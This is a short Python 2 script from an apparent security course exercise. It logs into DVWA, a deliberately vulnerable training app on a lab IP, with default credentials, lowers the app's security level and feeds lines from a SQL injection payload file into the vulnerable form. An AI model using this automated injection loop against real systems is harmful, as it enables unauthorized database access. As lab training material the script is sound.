#!/usr/bin/python

print "                 __                      "
print "                |__|____ ___  __         "
print "                |  \__  \\\\  \/ /       "
print "                |  |/ __ \\\\   /        "
print "            /\__|  (____  /\_/           "
print "            \______|    \/               "
print "                                         "

print	'Module 4'
print	'Attacking Web Applications'
print	'Exercice'
print

"""
Will attack DVWA
Use mechanize to try SQL injection on form fields and deduce which are vulnerable
	=> use sqlmap and check the code

http://www.hackyeah.com/wp-content/uploads/2010/05/HackYeah-SQL-Injection.pdf
"""

import sys
import mechanize
import cookielib
from bs4 import BeautifulSoup

#####################
# variables			#
#####################

dvwa = 'http://172.16.28.128/dvwa/login.php'
security_setting_url = 'http://172.16.28.128/dvwa/security.php'
sqli_url = 'http://172.16.28.128/dvwa/vulnerabilities/sqli/'
blind_sqli_url = 'http://172.16.28.128/dvwa/vulnerabilities/sqli_blind/'

# # # # create browser object
browser = mechanize.Browser()
# Cookie Jar
cj = cookielib.LWPCookieJar()
browser.set_cookiejar(cj)
# Browser options (or else website sometimes throws 403 error)
browser.set_handle_equiv(True)
browser.set_handle_redirect(True)
browser.set_handle_referer(True)
browser.set_handle_robots(False)
# Follows refresh 0 but not hangs on refresh > 0
browser.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
# User-Agent
browser.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1')]

#####################
# Functions			#
#####################

def dvwa_login(url, form, username, password) :
	
	browser.open(url)
	print 'Loging into : ', str(browser)
	
	# select the form to fill out
	browser.select_form(nr=form) 
	browser.form['username'] = username
	browser.form['password'] = password
	browser.submit()

def printForms():
	# find forms in the page:
	print('Forms on the page :')
	for form in browser.forms():
		print(form)

def test_SQLi(injection):
	browser.open(sqli_url)
	print 'Injecting : ',injection
	browser.select_form(nr=0)
	browser.form['id'] = injection
	browser.submit()

	html = browser.response().read()

	bs = BeautifulSoup(html, "lxml")
	IDs = bs.find_all('div', {'class' : 'vulnerable_code_area'})
	try :
		for ID in IDs[0].find_all('pre'):
			print '===> ', ID
	except :
		pass

#####################
# Main				#
#####################

# go to site
browser.open(dvwa)
print 'Visiting : ', browser.title()
# login
dvwa_login(dvwa, 0, 'admin', 'password')
print 'Visiting : ', browser.title()

# lower security setting
browser.open(security_setting_url)
print 'Visiting : ', browser.title()
print('Setting security to low')
browser.select_form(nr=0)
browser.form['security'] = ['low']
browser.submit()

# go to sqli page
browser.open(sqli_url)
print 'Visiting : ', browser.title()

injections = open('common_sqli', 'r').readlines()
for injection in injections :
	test_SQLi(injection.strip('\n\r'))

